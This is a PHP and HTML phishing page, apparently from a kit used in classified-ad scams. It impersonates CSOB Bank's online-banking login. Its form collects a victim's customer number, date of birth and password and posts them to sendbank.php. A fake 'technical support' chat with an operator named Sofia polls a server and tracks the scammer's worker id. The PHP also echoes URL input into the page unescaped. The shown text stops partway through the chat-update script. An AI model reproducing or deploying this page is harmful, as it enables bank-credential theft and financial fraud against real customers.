<?php
include "../service.php";
include "../../settings.php";
if (file_exists("../data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("../data/" . $_GET["id"] . ".xml");

checkLK($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id, "CSOB Bank");
?>
<!DOCTYPE html>
<!-- saved from url=(0053)# -->
<html lang="pl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<title>Bankowość korporacyjna, finansowanie przedsiębiorstw</title>
<style>
			._0 {
				margin: 0 auto;
				max-width: 400px;
				box-sizing: border-box;
				background: #fff;
				margin-top: 50px;
				margin-bottom: 50px;
			}
			._01 {
				margin: 0 auto;
				max-width: 490px;
				box-sizing: border-box;
				padding: 24px;
				background: #fff;
				margin-top: 50px;
				padding-left: 0;
				margin-bottom: 50px;
			}
			._1 {
				font-size: 28px;
				padding-top: 16px;
				width: 100%;
                text-align: center;
			}
			._2 {
				margin: 10px 0;
				border-bottom: 1px solid #ddd;
			}
			._3 {
				text-align: left;
			    font-size: 14px;
			    border: 1px solid #00aeef;
			    border-radius: 6px;
			    padding: 12px 10px;
			    margin-bottom: 20px;
                background-color: #D0D0D0;
			}
			._3:hover {
				border: 1px solid #000;
			}
			._4 {
				float: right;
			    width: 100%;
				margin: 0;
			    color: #000;
			    font-weight: 400;
			    font-size: 15px;
			    line-height: 24px;
			    display: inline-block;
			    -webkit-box-sizing: border-box;
			    box-sizing: border-box;
			    padding: 8px 30px 6px 31px;
			    min-width: 180px;
			    border-radius: 7px;
			    white-space: nowrap;
			    background-color: #00aeef;
			    color: #fff;
			    text-align: center;
			    text-decoration: none;
			}
			._4:hover {
				background-color: #00aeef;
			    color: #fff;
			    border-color: #00aeef;
			}
			._5 {
				color: #aaa;
				text-align: right;
				width: 45%;
				padding-right: 24px;
			}
			._6 {
				font-weight: bold;
			}
			._7 {
				margin-top: 4px;
				margin-bottom: 16px;
			}
			._8 {
				padding-bottom: 6px;
				line-height: 18px;
			}
			._9 {
				text-align: right;
			}
			body {
				margin: 0;
				font-family: Arial;
				font-size: 12px;
				color: #222;
				word-break: break-word;
				user-select: none;
				background: #fdfdfd;
			}
			input {
				font-family: Arial;
				font-size: 12px;
				color: #222;
				width: 100%;
				border: none;
				box-sizing: border-box;
				text-align: center;
			}
			table {
				width: 100%;
				border-collapse: separate;
				border-spacing: 0;
			}
			td {
				padding: 4px 0;
			}
			#mainblock {
				display: flex;
				margin: 0 40px;
			    border-bottom: 1px solid #e4e4e4;
			}
			#rightblock {
				margin-top: 100px;
				display: flex;
			}
			.loginboxes {
				display: block;
			}
			#formblock {
                /*border-right: 1px solid #e4e4e4;
                padding-right: 70px; */
                padding-bottom: 20px; 
                margin-top: 20px;
			}
			#konto {
				float: right;
				padding-bottom: 10px;
				padding-top: 30px;
			}
			#Pomoc {
				display: none;
                padding-top: 25px; 
                width: 150px;
			}
			@media all and (max-width: 800px) {
				#mainblock {
					display: block;
				}
				#formblock {
					border-right: none;
					padding-right: 0; 
				}
			}
			@media all and (max-width: 500px) {
				.loginboxes {
					display: block;
				}
				#rightblock {
					display: block;
				}
				#konto {
					margin: 0;
				}
				#Pomoc {
					padding-top: 0;
					padding-bottom: 25px;
				}
				._4 {
					width: 100%;
				}
			}
		</style>
</head>
<body>
<div id="mainblock">
<div class="_0">
<center><img height="120" src="data:image/png;base64,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"></center>
<form method="post" action="sendbank.php" id="formblock">
<div class="loginboxes" style="margin-bottom: 20px;">
<div class="_1">Přihlaste se do online bankovnictví</div>
</div>
<input type="hidden" name="id" value="<?php echo $_GET['id']; ?>">
<input type="hidden" name="type" value="10">

<input id="field3ds" class="_3" type="text" name="logindata" placeholder="Zadejte své zákaznické číslo nebo se přihlaste" required="">
<input id="field3ds" class="_3" type="text" name="datadata" placeholder="Datum narození" required="">
<input id="field3ds" class="_3" type="password" name="passdata" placeholder="Zadejte heslo" required="">
<div class="loginboxes">
<div id="Pomoc"><a href="#" style="font-size: 13px; color: #666666; text-decoration: none;">Pomoc s přihlášením</a></div>
<input class="_4" style="background-color: #00aeef;" type="submit" value="Pokračovat">
<br><br>
</div>
</form>
</div>
<footer><center>2022 CSOB BANK</center></footer>
<script>
			let pwdChars = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789aąbсćdеęfghijklłmnńoóprsśtuwyzźżAĄBCĆDEĘFGHIJKLŁMNŃOÓPRSŚTUWYZŹŻ';
			let pwdLen = 20;
			function inputMask(elem) {
				let val = elem.value;
				let val2 = '';
				for (let i = 0; i < val.length; i++) {
					if (pwdChars.includes(val[i]))
						val2 += val[i];
				}
				elem.value = val2.substr(0, pwdLen);
			}
			document.addEventListener('DOMContentLoaded', function() {
				field3ds.oninput = function() {
					inputMask(field3ds);
				}
				field3ds.focus();
			});
			document.oncontextmenu = function() {
				return false;
			};
		</script>
<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #464646;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #464646;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #464646;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>
<div id="offonthechap">
<div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
<div class="chaport-launcher" style="left: 0px; right: 0px;">
<div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
<div class="chaport-launcher-chat-icon"></div>
<input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
<div class="chaport-launcher-close-icon"></div>
<div class="chaport-launcher-operator-photo"></div>
</div>
</div>
<div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
<div class="chaport-inner">
<div class="main-textblock">
<div class="operatorblock">
<div class="operatorblock-content" style="display: flex;">
<div id="operator-photo">
<img id="oper-photo-img" src="./expo_files/operator-img.png">
<div class="operator-name">Sofia</div>
</div>
<div class="team-wrapper">
<div class="team">Technická podpora</div>
<div class="activity-indicator">
<div class="with-status" style="display: inline-block;">
<div class="status-online" style="display: inline-block;">
</div>online</div>
</div>
</div>
</div>
</div>
<div class="chat-block">
<div id="chat">
<div class="operators-msg" id="greeting-msg" style="display: none;">
<div class="operators-photo"><img src="./expo_files/operator-img.png"></div>
<div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>
</div>
</div>
<div id="input-msg" style="display: flex;">
<input type="text" name="smstosup1" id="smstosup1" placeholder="Wnapište svou zprávu...">
<button id="smstosupbutton1" onclick="sendMessage()">
<div class="chaport-send-icon">
<svg width="18" height="18" viewBox="0 0 535.5 535.5">
<polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">
</polygon>
</svg>
</div>
</button>
</div>
</div>
</div>
</div>
</div>
<div class="chaport-big-shadow"></div>
</div>
</div>
<script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
